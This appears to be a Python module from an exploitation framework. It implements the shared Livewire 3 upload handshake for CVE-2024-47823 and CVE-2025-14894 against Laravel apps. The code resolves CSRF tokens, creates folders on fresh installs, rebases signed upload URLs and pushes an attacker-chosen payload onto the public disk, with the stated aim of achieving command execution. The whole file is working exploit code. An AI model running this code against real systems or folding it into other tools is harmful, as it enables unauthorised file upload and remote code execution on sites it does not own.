#!/usr/bin/env python3
"""Shared Livewire-3 file-upload handshake (modules-root shared infra).

Both CVE-2024-47823 (the MIME-validation-bypass technique) and CVE-2025-14894
(unrestricted upload) drive the same Livewire 3 upload protocol against a public
file component:

    GET page -> resolve CSRF -> [ensure currentFolder] -> _startUpload(property,...)
    -> POST signed URL -> _finishUpload(property,...) -> file lands on the public disk.

The two apps differ only in surface details that used to be hard-coded per module and
made the exploit brittle:

  * CSRF presentation: a plaintext <meta name="csrf-token"> (X-CSRF-TOKEN / body _token)
    vs. no meta tag at all, where Laravel accepts the url-decoded XSRF-TOKEN cookie in
    the X-XSRF-TOKEN header. See resolve_csrf().
  * The upload property name ("files" for livewire-filemanager, "upload" for a simple
    custom component) — a parameter here, not a constant.
  * Fresh-install state where the component mounts with a null currentFolder and the
    upload sink dereferences it (addMedia() on null -> HTTP 500). ensure_current_folder()
    creates a folder via saveNewFolder so the upload lands.
  * A _finishUpload that 500s on a post-store side effect (e.g. Spatie image conversion
    calling an unavailable GD function) yet still persists the file. lw3_upload() can
    tolerate that and let the caller decide success by real command execution.

This module imports nothing from modules.detection / modules.exploitation, so either
subpackage may import it (exploitation -> modules root is the allowed direction).
Proxy/TLS/trace are applied process-wide by modules.core.http_config (it patches
requests.Session.request), so callers pass plain sessions — never hard-code proxies here.
"""

import html
import json
import re
import uuid
from typing import Optional, Tuple
from urllib.parse import urljoin, unquote

import requests

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


class LivewireComponent(dict):
    """Parsed public Livewire-3 component: snapshot, csrf presentation, update URL.

    A dict subclass so callers can treat it as a plain mapping; keys:
      snapshot, wire_id, csrf, csrf_header, csrf_token_field, livewire_prefix,
      update_url, page_url.
    """


class UploadResult:
    """Outcome of lw3_upload(): whether the file was parked + the post-handshake state."""

    __slots__ = ("stored", "snapshot", "effects", "finish_status", "signed_url")

    def __init__(self, stored, snapshot, effects, finish_status=None, signed_url=None):
        self.stored = stored
        self.snapshot = snapshot
        self.effects = effects
        self.finish_status = finish_status   # HTTP status of _finishUpload (200, or a tolerated 5xx)
        self.signed_url = signed_url


def resolve_csrf(session: requests.Session, body: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    """Resolve how to present CSRF for a Livewire /update POST.

    Returns (header_name, header_value, body_token_field):
      * plaintext <meta name="csrf-token"> (or a "csrfToken":"..." blob) ->
        ("X-CSRF-TOKEN", token, token)   # token also goes in the body `_token`
      * no meta tag, XSRF-TOKEN cookie present ->
        ("X-XSRF-TOKEN", url-decoded cookie, None)   # ciphertext must NOT go in `_token`
      * neither -> (None, None, None)

    Sending the wrong header name yields a 419, so callers must carry all three through.
    """
    m = re.search(r'name="csrf-token"\s+content="([^"]+)"', body)
    if m:
        token = html.unescape(m.group(1))
        return "X-CSRF-TOKEN", token, token
    m = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', body)
    if m:
        token = m.group(1)
        return "X-CSRF-TOKEN", token, token
    xsrf = session.cookies.get("XSRF-TOKEN")
    if xsrf:
        # The cookie is url-encoded in the jar; Laravel expects the decoded ciphertext.
        return "X-XSRF-TOKEN", unquote(xsrf), None
    return None, None, None


def fetch_component(session: requests.Session, page_url: str,
                    timeout: int = 15) -> Optional[LivewireComponent]:
    """GET a page and parse its public Livewire-3 component, or None.

    Requires a wire:snapshot and a resolvable CSRF presentation (meta token OR
    XSRF-TOKEN cookie). Scrapes the randomized livewire(-<hex>)/update prefix.
    """
    try:
        r = session.get(page_url, timeout=timeout, verify=False, allow_redirects=True)
    except requests.RequestException:
        return None
    if r.status_code != 200 or not r.text:
        return None
    body = r.text

    m = re.search(r'wire:snapshot="([^"]+)"', body)
    if not m:
        return None
    snapshot = html.unescape(m.group(1))

    csrf_header, csrf, csrf_field = resolve_csrf(session, body)
    if not csrf:
        return None

    wire_id_m = re.search(r'wire:id="([^"]+)"', body)
    prefix_m = re.search(r'(livewire(?:-[a-f0-9]+)?)/update', body)
    livewire_prefix = prefix_m.group(1) if prefix_m else "livewire"

    root = _root_of(str(r.url))
    update_url = urljoin(root + "/", livewire_prefix.strip("/") + "/update")

    return LivewireComponent({
        "snapshot": snapshot,
        "wire_id": wire_id_m.group(1) if wire_id_m else None,
        "csrf": csrf,
        "csrf_header": csrf_header,
        "csrf_token_field": csrf_field,
        "livewire_prefix": livewire_prefix,
        "update_url": update_url,
        "page_url": str(r.url),
    })


def livewire_update(session, update_url, component, calls, updates=None,
                    timeout=20, tolerate_500=False):
    """POST one Livewire-3 message; return (snapshot, effects, http_status).

    `component` carries the CSRF presentation (csrf / csrf_header / csrf_token_field).
    On a non-200: raise requests.RequestException unless tolerate_500 is set, in which
    case return (None, {}, status) so the caller can decide what to do.
    """
    csrf = component["csrf"]
    csrf_header = component.get("csrf_header", "X-CSRF-TOKEN")
    csrf_field = component.get("csrf_token_field")
    payload = {"components": [{"snapshot": component["snapshot"],
                               "updates": updates or {}, "calls": calls}]}
    if csrf_field:
        payload["_token"] = csrf_field
    r = session.post(
        update_url, json=payload,
        headers={"X-Livewire": "true", csrf_header: csrf},
        timeout=timeout, verify=False,
    )
    if r.status_code != 200:
        if tolerate_500:
            return None, {}, r.status_code
        raise requests.RequestException(f"{update_url} -> HTTP {r.status_code}: {r.text[:200]}")
    data = r.json()
    comp = data["components"][0]
    return comp["snapshot"], comp.get("effects", {}), r.status_code


def snapshot_model_key(snapshot: str, prop: str = "currentFolder"):
    """Return a Livewire model property's DB key from a snapshot, else None.

    Livewire serializes an Eloquent-model property as a 2-tuple [value, meta]. For a SET
    model the value slot is null and the identity lives in meta: {"class":...,"key":<id>,
    "s":"mdl"}. So the property is "set" iff meta carries a non-null key. A bare null
    (unset) reads as None. Reading value[0] (always null for a model) is the classic bug
    that makes a set folder look unset.
    """
    try:
        data = json.loads(snapshot).get("data", {})
    except (TypeError, ValueError, AttributeError):
        return None
    cf = data.get(prop)
    if isinstance(cf, list) and len(cf) >= 2 and isinstance(cf[1], dict):
        # Serialized model: identity is the meta `key`. A null key means the model is
        # not actually set, so it reads as None (do NOT fall through to the truthy tuple).
        return cf[1].get("key")
    return cf if cf else None


def ensure_current_folder(session, component, *, folder_prop="currentFolder",
                          method="saveNewFolder", name_prop="newFolderName", timeout=20):
    """If the component mounts with a null `folder_prop`, create one so uploads land.

    Calls saveNewFolder (which reads name_prop and ENTERS the new folder). Returns the
    component with its snapshot advanced ONLY if the folder actually became non-null;
    otherwise the original component is returned unchanged. Never raises (a missing
    folder step just means we proceed with the original snapshot).
    """
    if snapshot_model_key(component["snapshot"], folder_prop) is not None:
        return component
    try:
        snap, _, status = livewire_update(
            session, component["update_url"], component,
            calls=[{"path": "", "method": method, "params": []}],
            updates={name_prop: "poc" + uuid.uuid4().hex[:6], "isCreatingNewFolder": True},
            timeout=timeout, tolerate_500=True,
        )
    except requests.RequestException:
        return component
    if snap and snapshot_model_key(snap, folder_prop) is not None:
        advanced = LivewireComponent(component)
        advanced["snapshot"] = snap
        return advanced
    return component


def lw3_upload(session, component, *, prop, filename, payload, mime="image/png",
               is_multiple=True, tolerate_finish_500=True, timeout=20) -> UploadResult:
    """Run _startUpload -> signed POST -> _finishUpload for `prop`; return UploadResult.

    `component` must be current (post-ensure_current_folder). `payload` is the file bytes,
    `prop` the Livewire upload property ("files", "upload", or a Filament statePath).
    When tolerate_finish_500 is True, a non-200 _finishUpload is recorded (finish_status)
    but not raised — some sinks 500 on a post-store side effect yet still persist the file,
    so the caller decides success by real execution. stored is False only if the handshake
    could not park the file (no signed URL / rejected upload / no temp path).
    """
    comp = LivewireComponent(component)

    snap, effects, _ = livewire_update(
        session, comp["update_url"], comp,
        calls=[{"path": "", "method": "_startUpload",
                "params": [prop, [{"name": filename, "size": len(payload), "type": mime}], is_multiple]}],
        timeout=timeout,
    )
    comp["snapshot"] = snap

    signed_url = _signed_url_from_effects(effects, comp["page_url"])
    if not signed_url:
        return UploadResult(False, snap, effects)

    up = session.post(
        signed_url,
        files={"files[]": (filename, payload, mime)},
        headers={comp.get("csrf_header", "X-CSRF-TOKEN"): comp["csrf"]},
        timeout=timeout, verify=False,
    )
    if up.status_code not in (200, 201):
        return UploadResult(False, snap, effects, signed_url=signed_url)
    try:
        tmp_paths = up.json().get("paths", [])
    except (ValueError, TypeError):
        tmp_paths = []
    if not tmp_paths:
        return UploadResult(False, snap, effects, signed_url=signed_url)

    snap2, effects2, finish_status = livewire_update(
        session, comp["update_url"], comp,
        calls=[{"path": "", "method": "_finishUpload",
                "params": [prop, [tmp_paths[0]], is_multiple]}],
        timeout=timeout, tolerate_500=tolerate_finish_500,
    )
    # tolerated 500 -> snap2 is None; keep the post-startUpload snapshot.
    final_snap = snap2 if snap2 is not None else snap
    return UploadResult(True, final_snap, effects2 or effects, finish_status=finish_status,
                        signed_url=signed_url)


# --- internal helpers --------------------------------------------------------

def _root_of(url: str) -> str:
    from urllib.parse import urlparse
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


def _signed_url_from_effects(effects: dict, page_url: str) -> Optional[str]:
    """Pull the upload:generatedSignedUrl from a Livewire-3 effects.dispatches block.

    Re-bases an ABSOLUTE signed URL's host/scheme onto the connection target (page_url's
    host): Livewire builds the URL from the request Host, so a forced `Host:` override is
    reflected into the absolute URL and would otherwise be unreachable. The signed-URL
    signature covers PATH + QUERY only, so the host swap preserves validity. No-op when the
    signed host already matches the target. Mirrors _rebase_signed_host in
    modules/cves/cve_2025_14894.py.
    """
    root = _root_of(page_url)
    for event in (effects or {}).get("dispatches", []) or []:
        if event.get("name") != "upload:generatedSignedUrl":
            continue
        url = (event.get("params") or {}).get("url")
        if not url:
            continue
        if url.startswith("/"):
            return urljoin(root + "/", url.lstrip("/"))
        from urllib.parse import urlparse
        su, bu = urlparse(url), urlparse(root)
        if su.scheme and su.netloc and su.netloc != bu.netloc:
            return su._replace(scheme=bu.scheme or su.scheme, netloc=bu.netloc).geturl()
        return url
    return None
